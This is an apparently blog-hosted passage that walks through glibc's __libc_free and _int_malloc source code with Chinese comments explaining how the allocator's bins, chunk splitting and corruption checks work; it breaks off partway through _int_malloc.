<h2 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line">  <span class="comment">// 调用 __free_hook ，参数是是否的内存的地址。</span></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line">  <span class="comment">// 如果是 mmapp 得到的内存单独处理</span></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">      <span class="comment">// 释放的内存大小如果大于 mmap_threshold 并且小于 DEFAULT_MMAP_THRESHOLD_MAX(0x20000)</span></span><br><span class="line">      <span class="comment">// 则更新 mmap_threshold 为释放内存的大小，trim_threshold 为两倍释放内存的大小。</span></span><br><span class="line">      <span class="comment">// 其中 mmap_threshold 是 sysmalloc 中 brk 和 mmap 两种系统调用获取内存的选择的边界值</span></span><br><span class="line">      <span class="comment">// trim_threshold 为是否 systrim 减少 ptmalloc 保留内存的参考值</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">// 调用 nummap 释放内存</span></span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 调用 _int_free 释放内存</span></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> * _int_malloc (mstate av, <span class="type">size_t</span> bytes) &#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* 请求的chunk_size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;                 <span class="comment">/* 对应bin数组中的index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* 指向对应bin的指针 */</span></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* 指向分配的chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* 分配的chunk的size */</span></span><br><span class="line">  <span class="type">int</span> victim_index;                 <span class="comment">/* 分配的chunk的bin的index */</span></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* 指向分割后剩下的那块chunk */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;     <span class="comment">/* 分割后剩下的那块chunk的size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;                 <span class="comment">/* 一个block值 */</span></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* 用于链表操作 */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* 用于链表操作 */</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;        <span class="comment">/* 报错字符串指针 */</span></span><br><span class="line">  checked_request2size (bytes, nb); <span class="comment">/* 计算chunk_size */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="comment">//无可用的分配区,使用sysmalloc获取内存</span></span><br><span class="line">    <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	    alloc_perturb (p, bytes);</span><br><span class="line">      <span class="comment">//对数据用memset进行处理</span></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ())) &#123;</span><br><span class="line">    <span class="comment">//要分配的chunk大小小于global_max_fast则先从fastbin中寻找</span></span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    <span class="comment">//通过size获取在fastbin中对应的index</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">    <span class="comment">//通过index获取分配区的fastbin中对应的bin</span></span><br><span class="line">    mchunkptr pp = *fb;</span><br><span class="line">    <span class="comment">//获取bin的首个chunk</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      victim = pp;</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) != victim);</span><br><span class="line">    <span class="comment">//将头指针的下一个chunk作为空闲chunk链表的头部,这里使用lock-free的技术实现.Lock-free算法的基础是CAS(Compareand-Swap)原子操作.避免了ABA问题</span></span><br><span class="line">    <span class="comment">//此时victim是该fb原来的首个chunk,或者为0</span></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">//存在可使用的fastbin chunk</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="comment">//检测该chunk的size是否符合该bin的index</span></span><br><span class="line">        errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">      errout:</span><br><span class="line">        malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="comment">/* </span></span><br><span class="line"><span class="comment">      #if !MALLOC_DEBUG</span></span><br><span class="line"><span class="comment">      # define check_chunk(A, P)</span></span><br><span class="line"><span class="comment">      # define check_free_chunk(A, P)</span></span><br><span class="line"><span class="comment">      # define check_inuse_chunk(A, P)</span></span><br><span class="line"><span class="comment">      # define check_remalloced_chunk(A, P, N)</span></span><br><span class="line"><span class="comment">      # define check_malloced_chunk(A, P, N)</span></span><br><span class="line"><span class="comment">      # define check_malloc_state(A)</span></span><br><span class="line"><span class="comment">      非debug模式下这些宏定义为空</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      <span class="comment">//将chunk指针转化为mem指针,即指向data区域</span></span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      # define __glibc_unlikely(cond)	(cond)</span></span><br><span class="line"><span class="comment">      static int perturb_byte;</span></span><br><span class="line"><span class="comment">      static void alloc_perturb (char *p, size_t n) &#123;</span></span><br><span class="line"><span class="comment">        if (__glibc_unlikely (perturb_byte))</span></span><br><span class="line"><span class="comment">          memset (p, perturb_byte ^ 0xff, n);</span></span><br><span class="line"><span class="comment">      &#125; </span></span><br><span class="line"><span class="comment">      该函数配合calloc使用</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">      <span class="comment">//将分配出来的mem指针返回</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//victim为0说明对应fastbin无空闲chunk,继续进行分配</span></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb)) &#123;</span><br><span class="line">    <span class="comment">//所需的chunk大小属于smallbin</span></span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line">    <span class="comment">//根据index获得对应smallbin的表头</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin) &#123;</span><br><span class="line">      <span class="comment">//victim赋值为表尾,如果该表不为空</span></span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="number">0</span>)</span><br><span class="line">        <span class="comment">//victim为0,表示smallbin还没有初始化为双向循环链表,调用malloc_consolidate函数,此时由于global_max_fast也未初始化,所以会调用malloc_init_state初始化</span></span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) &#123;</span><br><span class="line">            <span class="comment">//双向链表检测,last(bin)-&gt;bk-&gt;fd == last(bin)</span></span><br><span class="line">            errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        <span class="comment">//设置inuse标志</span></span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line">        <span class="comment">//将victim从smallbin的双向循环链表中取出</span></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          <span class="comment">//如果是非主分配区,将标志bit清零</span></span><br><span class="line">          victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">        <span class="comment">//同上,正常的分配流程</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//该表为空则继续分配</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//所需的chunk大小属于largebin</span></span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">      <span class="comment">//调用malloc_consolidate()函数合并fastbin chunk,并将这些空闲chunk加入unsorted_bin中</span></span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123;</span><br><span class="line">      <span class="comment">//反向遍历unsorted_bin,遍历结束的条件是unsorted_bin为空</span></span><br><span class="line">      <span class="comment">//victim是unsorted_bin中最后一个chunk</span></span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">      <span class="comment">//bck是unsorted_bin中倒数第二个chunk</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        <span class="comment">//chunk的大小不能小于等于2 * SIZE_SZ,也不能超过该分配区总的内存分配量</span></span><br><span class="line">        malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>, chunk2mem (victim), av);</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line">      <span class="comment">//获取最后一个chunk的size</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) &#123;</span><br><span class="line">        <span class="comment">//如果请求的chunk大小为smallbin范围,且unsorted_bin中只有一个last_remainder chunk,且其大小大于所需chunk的大小加上MINSIZE</span></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        <span class="comment">//计算切分后剩余chunk的size</span></span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line">        <span class="comment">//计算切分后剩余chunk的地址</span></span><br><span class="line">        unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">        <span class="comment">//将切分后剩余的chunk放入unsorted_bin</span></span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        <span class="comment">//设置为last_remainder chunk</span></span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">        <span class="comment">//设置last_remainder chunk的bk和fd</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (remainder_size)) &#123;</span><br><span class="line">          <span class="comment">//若剩下的chunk属于largebin chunk,将其fd_nextsize和bk_nextsize设置为NULL</span></span><br><span class="line">          remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        <span class="comment">//设置头部(addr + 0x8),包括大小和标志位,由于临近的前一个chunk一定位于使用中,所以PREV_INUSE为1</span></span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        <span class="comment">//同理,由于victim会被分配给用户,所以PREV_INUSE为1</span></span><br><span class="line">        set_foot (remainder, remainder_size);</span><br><span class="line">        <span class="comment">//该chunk不在使用中,使用set_foot对该chunk的inuse标志位置零</span></span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">        <span class="comment">//同上,正常的分配流程</span></span><br><span class="line">      &#125;</span><br><span class="line">      unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">      <span class="comment">//不满足上述情况则将该chunk从unsorted_bin链表中取出</span></span><br><span class="line">      <span class="keyword">if</span> (size == nb) &#123;</span><br><span class="line">        <span class="comment">//victim大小与所需的chunk大小一致</span></span><br><span class="line">        set_inuse_bit_at_offset (victim, size);</span><br><span class="line">        <span class="comment">//对victim的inuse标志位置零</span></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          <span class="comment">//不属于主分配区则对对应的标志位置零</span></span><br><span class="line">          victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">        <span class="comment">//同上,正常的分配流程</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//到这说明该victim会放入对应的bin链表</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (size)) &#123;</span><br><span class="line">        <span class="comment">//victim属于smallbin</span></span><br><span class="line">        victim_index = smallbin_index (size);</span><br><span class="line">        <span class="comment">//获得所属smallbin的index</span></span><br><span class="line">        bck = bin_at (av, victim_index);</span><br><span class="line">        <span class="comment">//将该smallbin的链表表头赋值给bck</span></span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="comment">//该smallbin第一个chunk赋值给fwd</span></span><br><span class="line">        <span class="comment">//victim会插入到bck和fwd之间,作为该smallbin链表的第一个chunk.</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//victim属于largebin</span></span><br><span class="line">        victim_index = largebin_index (size);</span><br><span class="line">        <span class="comment">//获得所属largebin的index</span></span><br><span class="line">        bck = bin_at (av, victim_index);</span><br><span class="line">        <span class="comment">//将该largebin的链表表头赋值给bck</span></span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="comment">//该largebin第一个chunk赋值给fwd</span></span><br><span class="line">        <span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">          <span class="comment">//该largebin中有空闲chunk存在</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">//将当前chunk的size的inuse标志bit置位,便于加快chunk大小的比较</span></span><br><span class="line">          assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          <span class="comment">//断言该largebin最后一个chunk的size字段中的非主分配区的标志bit没有置位</span></span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line">            <span class="comment">//当前chunk比最后一个chunk小,就插入到该largebin的链表的最后</span></span><br><span class="line">            fwd = bck;</span><br><span class="line">            <span class="comment">//fwd赋值为表头</span></span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line">            <span class="comment">//bck赋值为最后一个chunk</span></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            <span class="comment">//将victim插入chunk size链表的尾部,该链表是从大到小排列的</span></span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="comment">//断言该largebin第一个chunk的size字段中的非主分配区的标志bit没有置位</span></span><br><span class="line">            <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">              <span class="comment">//正向遍历chunk size链表,直到找到第一个小于等于当前chunk大小的chunk</span></span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">              <span class="comment">//同一大小的chunk已经存在,则不需要修改chunk size链表,当前chunk插入fwd之后</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//当前chunk大于fwd,则将当前chunk作为该chunk size的代表加入chunk size链表,位置为fwd的前面</span></span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">          <span class="comment">//如果largebin中没有chunk,直接将当前chunk加入chunk size链表,chunk size链表表头位于第一个chunk的fd_nextsize和bk_nextsize,所以第一个chunk是最大的</span></span><br><span class="line">          victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line">      mark_bin (av, victim_index);</span><br><span class="line">      <span class="comment">//将对应map里该index对应的标志位置1</span></span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br><span class="line">      <span class="comment">//将当前chunk插入到对应bin中</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">        <span class="comment">//如果unsorted_bin中的chunk超过了10000个,最多遍历10000个就退出</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//此时unsorted_bin链表已经处理完成</span></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (nb)) &#123;</span><br><span class="line">      <span class="comment">//所需分配的chunk大小为largebin</span></span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      <span class="comment">//获取对应的bin</span></span><br><span class="line">      <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb)) &#123;</span><br><span class="line">        <span class="comment">//如果largebin链表不为空且链表中最大的chunk大于所需chunk的大小,则遍历该largebin链表,找到合适的chunk</span></span><br><span class="line">        victim = victim-&gt;bk_nextsize;</span><br><span class="line">        <span class="comment">//从最后一个也就是最小一个开始遍历</span></span><br><span class="line">        <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">          <span class="comment">//反向遍历chunk size链表,直到找到第一个大于等于所需chunk大小的chunk退出循环</span></span><br><span class="line">          victim = victim-&gt;bk_nextsize;</span><br><span class="line">        <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">          <span class="comment">//如果victim不是链表中的最后一个chunk且与victim大小相同的chunk不止一个,意味着victim为chunk size链表中的节点,取victim-&gt;fd节点对应的chunk作为候选chunk</span></span><br><span class="line">          victim = victim-&gt;fd;</span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        <span class="comment">//由于size可能大于所需的chunk,所以要计算看是否要划分</span></span><br><span class="line">        unlink (av, victim, bck, fwd);</span><br><span class="line">        <span class="comment">//调用unlink宏函数将victim从largebin链表中取出</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE) &#123;</span><br><span class="line">          <span class="comment">//如果将victim切分后剩余大小小于MINSIZE,则将整个victim返回,实际分配的chunk比所需的chunk要大一些</span></span><br><span class="line">          set_inuse_bit_at_offset (victim, size);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">//从victim中切分出所需的chunk,剩余部分作为一个新的chunk加入到unsorted_bin,其他处理与前面类似</span></span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          bck = unsorted_chunks (av);</span><br><span class="line">          fwd = bck-&gt;fd;</span><br><span class="line">	        <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck)) &#123;</span><br><span class="line">            <span class="comment">//验证第一个chunk的bk</span></span><br><span class="line">            errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">          &#125;</span><br><span class="line">          remainder-&gt;bk = bck;</span><br><span class="line">          remainder-&gt;fd = fwd;</span><br><span class="line">          bck-&gt;fd = remainder;</span><br><span class="line">          fwd-&gt;bk = remainder;</span><br><span class="line">          <span class="comment">//将remainder插入为unsorted_bin的第一个chunk</span></span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (remainder_size)) &#123;</span><br><span class="line">            <span class="comment">//若剩下的chunk属于largebin chunk,将该chunk的fd_nextsize和bk_nextsize设置为NULL</span></span><br><span class="line">            remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">          set_foot (remainder, remainder_size);</span><br><span class="line">          <span class="comment">//划分后设置,同上</span></span><br><span class="line">        &#125;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">        <span class="comment">//返回chunk过程,同上</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//从最合适的smallbin或largebin中都没有分配到需要的chunk,则查看比当前bin的index大的smallbin或largebin是否有空闲chunk可利用来分配所需的chunk</span></span><br><span class="line">    ++idx;</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line">    <span class="comment">//获取下一个相邻bin的空闲chunk链表</span></span><br><span class="line">    block = idx2block (idx);</span><br><span class="line">    <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">    bit = idx2bit (idx);</span><br><span class="line">    <span class="comment">//获取该bin对于binmap中的bit位的值,使用binmap可以加快查找bin是否包含空闲chunk,idx2bit宏将idx指定的位设置为1,其它位清零</span></span><br><span class="line">    <span class="keyword">for</span> (;; ) &#123;</span><br><span class="line">      <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//map为0即该block所对应的所有bins中都没有空闲chunk.于是遍历binmap的下一个block,直到找到一个不为0的block或者遍历完所有的block</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (++block &gt;= BINMAPSIZE)</span><br><span class="line">            <span class="comment">//遍历完所有的block都没有则使用top chunk分配</span></span><br><span class="line">            <span class="keyword">goto</span> use_top;</span><br><span class="line">        &#125; <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">        bit = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//在一个block遍历对应的bin直到找到一个bit不为0退出遍历</span></span><br><span class="line">        bin = next_bin (bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        assert (bit != <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      victim = last (bin);</span><br><span class="line">      <span class="comment">//将bin链表中的最后一个chunk赋值给victim</span></span><br><span class="line">      <span class="keyword">if</span> (victim == bin) &#123;</span><br><span class="line">        <span class="comment">//victim与bin链表头指针相同,表示该bin中没有空闲chunk,binmap中的相应位设置不准确,将binmap的相应bit位清零,获取当前bin下一个bin,将bit移到下一个bit位,即乘以2</span></span><br><span class="line">        av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit;</span><br><span class="line">        bin = next_bin (bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//当前bin中的最后一个chunk满足要求,获取该chunk的大小,计算切分出所需chunk后剩余部分的大小,然后将victim从bin的链表中取出</span></span><br><span class="line">        size = chunksize (victim);</span><br><span class="line">        assert ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        unlink (av, victim, bck, fwd);</span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE) &#123;</span><br><span class="line">          set_inuse_bit_at_offset (victim, size);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span 